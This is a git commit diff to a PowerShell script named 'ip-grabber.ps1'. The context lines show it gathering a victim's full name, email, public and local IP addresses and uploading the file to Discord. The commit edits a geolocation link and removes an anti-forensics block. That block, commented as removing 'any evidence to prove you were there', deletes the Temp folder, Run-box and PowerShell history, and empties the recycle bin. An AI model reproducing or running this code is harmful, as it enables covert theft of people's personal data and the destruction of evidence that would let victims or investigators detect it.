0751a3706d7c783588ba8a0008f0a12c1dc85fc0
nate <69339422+nanitt@users.noreply.github.com>
2023-06-12 00:43:45 -0400

    Update ip-grabber.ps1

--- ip-grabber.ps1
+++ ip-grabber.ps1
@@ -104,11 +104,10 @@ Full Name: $fullName
 
 Email: $email
 
-Location:
-https://ipgeolocation.io/$computerPubIP
 ------------------------------------------------------------------------------------------------------------------------------
 Public IP: 
 $computerPubIP
+https://ipgeolocation.io/ip-location/$computerPubIP
 
 Local IPs:
 $localIP
@@ -146,25 +145,5 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
 
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
